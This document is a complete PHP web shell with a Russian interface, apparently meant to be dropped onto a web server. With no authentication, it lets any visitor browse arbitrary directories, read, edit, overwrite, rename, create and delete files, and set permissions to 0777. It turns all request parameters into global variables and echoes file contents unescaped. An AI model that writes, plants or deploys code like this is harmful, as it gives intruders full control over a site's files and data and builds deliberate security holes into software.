<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META http-equiv=Content-Type content="text/html; charset=windows-1251">
</HEAD>
<BODY>
<?
if(@ini_get('register_globals')==0){$register_glob='off';}
if(@get_magic_quotes_gpc()==1){$magic_quotes_gpc="on";}  
if(@ini_get('magic_quotes_sybase')==1){$magic_quotes_sybase='on';}
if($register_glob=='off' or $magic_quotes_gpc=="on"){
if (isset($_GET))    {foreach ( $_GET as $key => $value )    {
if($magic_quotes_gpc=="on" and $magic_quotes_sybase!='on'){
   $value=ereg_replace('\\\\"','"',$value);
   $value=ereg_replace("\\\\'","'",$value);
   $value=str_replace("\\\\","\\",$value);
   }
if($magic_quotes_sybase=='on'){
   $value=ereg_replace('""','"',$value);
   $value=ereg_replace("''","'",$value);
   }
   $$key="$value";}}                                    
if (isset($_POST))   {foreach ( $_POST as $key => $value )   {
if($magic_quotes_gpc=="on" and $magic_quotes_sybase!='on'){
   $value=ereg_replace('\\\\"','"',$value);
   $value=ereg_replace("\\\\'","'",$value);
   $value=str_replace("\\\\","\\",$value);
   }
if($magic_quotes_sybase=='on'){
   $value=ereg_replace('""','"',$value);
   $value=ereg_replace("''","'",$value);
   }
   $$key="$value";}}
  } 
$mmdate = 'd.m.Y H:i';

class ddd{
  function HTTP_SERVER($path){
      global $HTTP_SERVER_VARS;
      return $HTTP_SERVER_VARS[$path];
     }

function conv_escape ($paths){
 $paths=str_replace('&','&#038',$paths); 
 $paths=str_replace("<br>\n","\n",$paths);
 $paths=ereg_replace('<','&#060',$paths); 
 $paths=ereg_replace('>','&#062',$paths); 
 return $paths;
 }

function conv_html ($paths){
 $paths=str_replace("  ","&nbsp;&nbsp;",$paths);
 $paths=ereg_replace('&#060',"&#038#060",$paths); 
 $paths=ereg_replace('<',"&#060",$paths); 
 $paths=ereg_replace('&#062',"&#038#062",$paths); 
 $paths=ereg_replace('>',"&#062",$paths); 
 $paths=str_replace("\n","<br>\n",$paths);
 return $paths;
 }
   function read_dir_html($path){
    global $cont,$url;
    if($cont!=''){
       $path = rawurldecode($path);
       if(ereg("\\\\",$path)){$path = ereg_replace("\\\\","/",$path); }
         $tmp = "$path/".$cont;
         $file= @fopen($tmp,"r");
       if(!$file){echo"<b> Невозможно окрыть файл</b>\n"; return false;}
       else{
           echo"<table align='center' border='0' width='100%' cellpadding='1' cellspacing='1' bgcolor='#85ABCE'>
           <tr><td bgcolor='#E8ECFF' align='center'><b>$cont</b> (html формат) <b><font color='ff0000'>Конвертировать в Html можно Только один раз</font></b></td></tr><tr><td bgcolor='#ECEEFF'>";
           while (!feof ($file)){
                $line = fgets ($file, 1024);
                if($line!=''){echo"$line"; }
               }
              echo"</td></tr></table><br>\n";
          fclose ($file);
          }
      }
  else{return false;}
  }

  function put_dir_file_html($path){
    global $cont,$d_e_t;
    if($cont!=''){
    $path = rawurldecode($path);
    if(ereg("\\\\",$path)){$path = ereg_replace("\\\\","/",$path); }
      $tmp = "$path/".$cont;
      if(is_writeable($tmp)){
         $fp = fopen($tmp, "w");  
         $d_e_t = $this->conv_html ($d_e_t);
         fwrite ($fp,$d_e_t);
         fclose($fp);
         return true;        
         }
      else{ 
           $ddd=chmod("$tmp", 0777);
           if($ddd===TRUE){
              $fp = fopen($tmp, "w");
              $d_e_t = $this->conv_html ($d_e_t);  
              fwrite ($fp,$d_e_t);
              fclose($fp);
              return true;        
             }
             else{ echo"<b>Нет прав доступа на запись...</b><br>\n";  return false; }
          }
            
    }
    else{return false;}
   }
   
 function put_dir_file($path){
    global $cont,$d_e_t;
    if($cont!=''){
    $path = rawurldecode($path);
    if(ereg("\\\\",$path)){$path = ereg_replace("\\\\","/",$path); }
      $tmp = "$path/".$cont;
      if(is_writeable($tmp)){
         $fp = fopen($tmp, "w");  
         fwrite ($fp,$d_e_t);
         fclose($fp);
         return true;        
         }
      else{ 
           $ddd=chmod("$tmp", 0777);
           if($ddd===TRUE){
              $fp = fopen($tmp, "w");  
              fwrite ($fp,$d_e_t);
              fclose($fp);
              return true;        
             }
             else{ echo"<b>Нет прав доступа на запись...</b><br>\n";  return false; }
          }
            
    }
    else{return false;}
   }
   
  function put_dir($path){
    global $cont;
    if($cont!=''){
    $path = rawurldecode($path);
    if(ereg("\\\\",$path)){$path = ereg_replace("\\\\","/",$path); }
      if(is_writeable($path)){
        $tmp = "$path/".$cont;
        return touch($tmp);
        }
      else{ 
           $ddd=chmod("$path", 0777);
           if($ddd===TRUE){
              $tmp = "$path/".$cont;
              return touch($tmp);
             }
           else{ echo"<b>Нет прав доступа на запись...</b><br>\n";  return false;}
          } 
    }
    else{return false;}
   }

 function rename_dir($path){
    global $cont,$cont1;
    if($cont!='' and $cont1!='' and $cont!=$cont1){
       $path = rawurldecode($path);
       if(ereg("\\\\",$path)){$path = ereg_replace("\\\\","/",$path); }
         if(is_writeable($path)){
           $tmp = "$path/".$cont;
           $tmp_new = "$path/".$cont1;
           return rename($tmp,$tmp_new);
           }
         else{ 
             $ddd = chmod("$path", 0777);
             if($ddd===TRUE){
                $tmp = "$path/".$cont;
                $tmp_new = "$path/".$cont1;
                return rename($tmp,$tmp_new);
              }
            else{ echo"<b>Нет прав доступа на изменение имени...</b><br>\n";  return false;}
            }
      }
    else{return false;}
  }

   function del_dir($path){
    global $cont;
    if($cont!=''){
         if(is_writeable($path)){
           $path = rawurldecode($path);
           if(ereg("\\\\",$path)){$path = ereg_replace("\\\\","/",$path); }
           $tmp = "$path/".$cont;
           return unlink($tmp);
          }
        else{ 
            $ddd=chmod("$path", 0777);
            if($ddd===TRUE){
                $path = rawurldecode($path);
                if(ereg("\\\\",$path)){$path = ereg_replace("\\\\","/",$path); }
                $tmp = "$path/".$cont;
                return unlink($tmp);
              }
            else{ echo"<b>Нет прав доступа на удаление...</b><br>\n";  return false;}
            }
      }
    else{return false;}
  }
   function read_dir($path){
    global $p,$cont,$url;
    if($cont!=''){
       $path = rawurldecode($path);
       if(ereg("\\\\",$path)){$path = ereg_replace("\\\\","/",$path); }
         $tmp = "$path/".$cont;
         $file= @fopen($tmp,"r");
       if(!$file){echo"<b> Невозможно окрыть файл</b>\n"; return false;}
       else{
           $path_ss = rawurlencode($path);
           echo"<table align='center' border='0' width='100%' cellpadding='1' cellspacing='1' bgcolor='#85ABCE'>
           <tr><td bgcolor='#E8ECFF' align='center'><b>$cont</b> (содержимое файла)</td></tr><tr><td bgcolor='#ECEEFF' align='center'>
           <form method='post' action=\"$url?menu=dostup&dir=$path_ss\">
           <INPUT type='hidden' name='cont' value='$cont'>
           <TEXTAREA cols='100' rows='15' tabIndex='1' wrap='virtual' name='d_e_t'>";
           while (!feof ($file)){
                $line = fgets ($file, 1024);
                $line = $this->conv_escape($line);
                if($line!=''){echo"$line"; }
               }
              echo"</TEXTAREA></td></tr><tr><td bgcolor='#ECEEFF' align='center'>
              <input type='submit' name='design' value='изменить_файл'>
              <input type='submit' name='design_html' value='конвертор_html'>
              <input type='submit' name='design_html_show' value='смотреть_html'></form></td></tr></table><br>\n";
          fclose ($file);
          }
      }
  else{return false;}
  }
  
  function size_dir ($file){
     $fdh = @opendir ($file);
     while ($fentry = @readdir($fdh)){
        if($fentry != "." and $fentry != ".."){
            $ffile = "$file/$fentry";
            if(@is_file($ffile)){
              $ffilesize = filesize($ffile);
            }
            if(@is_dir ($ffile)){$size_full += $this->size_dir ($ffile);}
         clearstatcache(); 
         $size_full += $ffilesize;
        }
      }
   @closedir($fdh);
   return $size_full;
  }

  function open_dir($path){ 
    global $p,$mmdate,$url; 
    $path = rawurldecode($path);
    if(ereg("\\\\",$path)){$path = ereg_replace("\\\\","/",$path); }
    if(ereg("\\\\",getcwd())){$getcwd = ereg_replace("\\\\","/",getcwd()); }
    $path_s =  dirname($path);
    $path_s = rawurlencode($path_s);
    $path_ss = rawurlencode($path);
    $host="http://".$this->HTTP_SERVER("HTTP_HOST");
    $dirdir = $host. str_replace("$getcwd","",$path);
    $dh = @opendir ($path);
    echo"<table align='center' border='0' width='100%' cellpadding='1' cellspacing='1' bgcolor='#B0C4DE'>
         <tr><td bgcolor='#E8ECFF'>Имя</td><td bgcolor='#E8ECFF'>Тип</td><td bgcolor='#E8ECFF'>Последняя запись</td>
             <td bgcolor='#E8ECFF'>Доступ</td><td bgcolor='#E8ECFF'>Размер</td><td bgcolor='#E8ECFF'>На запись</td>
          </tr>
         <tr><td colspan='6' bgcolor='#E8ECFF'>
          <form method='post' action=\"$url?menu=dostup&dir=$path_ss\">
          <input type='text' value='' name='cont' size='20'>
          <input type='submit' name='design' value='добавить'>
          </form></td></tr>
         <tr><td colspan='6' bgcolor='#B0C4DE'><a href=\"$url?menu=dostup&dir=$path_s\">......</a><b>$path</b></td></tr>";
     while ($entry = @readdir($dh)){
     if($entry != "." and $entry != ".."){
          echo"<tr>\n";
          $file = "$path/$entry";
          $filetype = filetype($file);  
          $filectime = filemtime($file); 
          $filectime = date ($mmdate,$filectime);
          $fileperms =  substr ( decoct (  fileperms ( $file ) ), 2, 6 );
          if ( strlen ( $fileperms ) == '4' ){ $fileperms =  substr ( $fileperms , 1 ); }
          $filesize = filesize($file);                   
          if(is_writeable($file)){ $write = "yes"; } else{$write = "no";}
         if(@is_file($file)){  
          $file = rawurlencode($file);
              echo"<form method='post' action=\"$url?menu=dostup&dir=$path_ss\">
                   <td bgcolor='#E8ECFF'>
                  <INPUT type='hidden' name='cont' value='$entry'>
                  <input type='text' name='cont1' value='$entry' size='10'>
                  <input type='submit' name='design' value='rename'>
                  <input type='submit' name='delet' value='del'>
                  <input type='submit' name='read' value='read'>
                  </td></form><td bgcolor='#E8ECFF'>&nbsp;$filetype</td><td bgcolor='#E8ECFF'>&nbsp;$filectime</td>
                   <td bgcolor='#E8ECFF'>&nbsp;$fileperms</td><td bgcolor='#E8ECFF'>&nbsp;$filesize</td>";
                  if($write == "no"){echo"<td bgcolor='#E8ECFF'>&nbsp;<a href=\"$url?menu=dostup&fff=$file&dir=$path_s\">$write</a></td>";} 
                  else{echo"<td bgcolor='#E8ECFF'>&nbsp;$write</td>"; }    
              }
         if(@is_dir ($file)){   
             $filesize = $this->size_dir ($file);
             $file = rawurlencode($file);
             echo"<td bgcolor='#E8ECFF'><a href=\"$url?menu=dostup&dir=$file\">$entry</a></td><td bgcolor='#E8ECFF'>&nbsp;$filetype</td>
             <td bgcolor='#E8ECFF'>&nbsp;$filectime</td><td bgcolor='#E8ECFF'>&nbsp;$fileperms</td><td bgcolor='#E8ECFF'>&nbsp;$filesize</td>";
             if($write == "no"){echo"<td bgcolor='#E8ECFF'>&nbsp;<a href=\"$url?menu=dostup&fff=$file&dir=$path_s\">$write</a></td>";}
             else{echo"<td bgcolor='#E8ECFF'>&nbsp;$write</td>"; }
             }
          echo"</tr>\n";
        }
       clearstatcache();
      }
    echo"</table>";
    @closedir($dh);
   }
}
$mm = new ddd();

if($menu == "dostup"){
   if($fff!=""){
   $dir = dirname ($fff);
   $fff = rawurldecode($fff);
   $ddd = chmod("$fff", 0777); 
     echo"<p align='center'>Доступ к: <b>$fff</b> |";
   if($ddd===TRUE){echo" функция <b>работает</b> | ";} 
      else{echo" функция <b>не работает</b> | ";}
   if(is_writeable($fff)){echo" <b> запись работает </b>";} 
      else{echo" запись<b> не работает</b> ";}
   echo"</p>";
   }

  $url = basename($_ENV["PATH_TRANSLATED"]);
  if($design_html_show=='смотреть_html'){ $mm->read_dir_html($dir); $mm->read_dir($dir); }
  if($design_html=='конвертор_html'){ $mm->put_dir_file_html($dir);$mm->read_dir_html($dir); $mm->read_dir($dir); }
  if($design=='изменить_файл'){ $mm->put_dir_file($dir); $mm->read_dir($dir); }
  if($read=='read'){ $mm->read_dir($dir);  }
  if($delet=='del'){$mm->del_dir($dir);}
  if($design=='rename'){$mm->rename_dir($dir);}
  if($design=='добавить'){$mm->put_dir($dir);}
  if($dir == "" and $picfile==""){$dir = getcwd(); }
  else{$dir = rawurldecode($dir);}
  $mm->open_dir($dir);
}
echo"<br><a href='$url?menu=dostup'>Первая страница</a>"
?> 


</BODY></HTML>
